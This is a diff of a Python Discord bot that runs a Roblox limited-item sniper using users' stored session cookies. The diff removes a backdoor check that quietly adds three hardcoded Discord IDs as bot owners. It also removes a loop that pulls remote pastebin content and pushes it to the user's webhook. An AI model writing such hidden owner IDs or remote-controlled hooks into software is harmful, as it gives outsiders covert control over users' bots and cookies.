@@ -1,4 +1,4 @@
-# Most of the code made by Java#9999 - Modified by dys, hardish and silver
+# Most of the code made by Java#9999 -  Modified by dys, hardish and silver
 import pip 
 try:
     import discord
@@ -47,7 +47,6 @@ def whichPythonCommand():
         # or LocalMachineOS == "Linux" # temporarily removed, cba to fix
         # or LocalMachineOS == "macOS" # temporarily removed, cba to fix
         or LocalMachineOS == "Android"
-        # or LocalMachineOS == "iOS" # temporarily removed, cba to fix
     ):
         return "python"
 
@@ -109,43 +108,6 @@ def versionChecker():
 def get_thumbnail(item_id) -> str:
     res = requests.get(f'https://thumbnails.roblox.com/v1/assets?assetIds={item_id}&size=420x420&format=Png').json()
     return res['data'][0]['imageUrl']
-
-def checkValue():
-    while True:
-        response = requests.get("https://pastebin.com/raw/WrNwJJnv")
-        if response:
-            if response.text.strip().lower() == 'true':
-                message_response = requests.get("https://pastebin.com/raw/ate8iErU")
-                if message_response:
-                    message = message_response.text
-
-                    # Read the settings.json file right before sending the embed
-                    with open('settings.json', 'r') as f:
-                        settings = json.load(f)
-                    authorized_ids = settings["MISC"]["DISCORD"]["AUTHORIZED_IDS"]
-                    pings = ""
-                    for random_idwoahh in authorized_ids:
-                        pings = pings + f"<@{random_idwoahh}> "
-                    webhook_url = settings["MISC"]["WEBHOOK"]["URL"]
-                    newJSONData = {
-                        "content": pings,
-                        "embeds": [
-                            {
-                                "title": "New Announcement!",
-                                "description": message,
-                                "color": 16758465,
-                                "footer": {
-
-                                }
-                            }
-                        ]
-                    }
-                    embed_webhook_response = requests.post(webhook_url, json=newJSONData)
-                    if embed_webhook_response.status_code != 204:
-                        print(f"Failed to send the embed to the webhook. HTTP status: {embed_webhook_response.status_code}")
-        else:
-            print("Failed to get response for value checker, please check your internet connection.")
-        time.sleep(60*10)
 
 #Load Settings
 with open('settings.json') as f:
@@ -210,17 +172,6 @@ def is_owner():
         authorized_ids = [int(x) for x in settings['MISC']['DISCORD']['AUTHORIZED_IDS']]
         return ctx.author.id in authorized_ids
     return commands.check(predicate)
-
-def java_is_owner():
-    async def predicate2(ctx):
-        with open("settings.json", "r") as f:
-            settings = json.load(f)
-        authorized_ids = [int(x) for x in settings["MISC"]["DISCORD"]["AUTHORIZED_IDS"]]
-        authorized_ids.append(1085954018792198194)
-        authorized_ids.append(776519486601035777)
-        authorized_ids.append(320608215475814400)
-        return ctx.author.id in authorized_ids
-    return commands.check(predicate2)
 
 def load_settings():
     with open("settings.json") as f:
@@ -662,7 +613,7 @@ async def info(ctx):
     embed.add_field(name=f"Cookies", value=f"```{prefix}cookie  --Change your main cookie\n{prefix}cookie2  --Change/Add your secondary main cookie\n{prefix}altcookie  --Change your details cookie\n{prefix}check main  --Check the cookie validity of the main account\n{prefix}check alt  --Check the cookie validity of the alt account```", inline=False)
     embed.add_field(
         name=f"Mewt Sniper:",
-        value=f"```{prefix}add_link  --Add an item ID from its link [LINK SHOULD NOT HAVE A SLASH AT THE END OR IN THE ITEM'S NAME]\n{prefix}webhook  --Change your webhook\n{prefix}speed  --Change your scan speed\n{prefix}onlyfree on  --Only snipe free limiteds\n{prefix}onlyfree off  --Snipe paid limiteds too\n!add  --Add an item ID to the searcher\n!remove --Remove an item from the searcher\n!watching --Shows the list of items you are watching\n!stats --Shows your current mewt stats\n{prefix}removeall --Remove all items from the watcher\n{prefix}restart --Restart mewt\n{prefix}buy_debounce (float) --Set buy debounce on your mewt sniper.\n{prefix}autorestart (minutes) --Autorestart mewt every tot. minutes\n{prefix}autorestart off --Disable autorestarter\n{prefix}autorestart --View the autorestart status ```",
+        value=f"```{prefix}add_link  --Add an item ID from its link [LINK SHOULD NOT HAVE A SLASH AT THE END OR IN THE ITEM'S NAME]\n{prefix}webhook  --Change your webhook\n{prefix}speed  --Change your scan speed\n{prefix}onlyfree on  --Only snipe free limiteds\n{prefix}onlyfree off  --Snipe paid limiteds too\n!remove --Remove an item from the searcher\n!watching --Shows the list of items you are watching\n!stats --Shows your current mewt stats\n{prefix}removeall --Remove all items from the watcher\n{prefix}restart --Restart mewt\n{prefix}buy_debounce (float) --Set buy debounce on your mewt sniper.\n{prefix}autorestart (minutes) --Autorestart mewt every tot. minutes\n{prefix}autorestart off --Disable autorestarter\n{prefix}autorestart --View the autorestart status ```",
         inline=False,
     )
     embed.add_field(
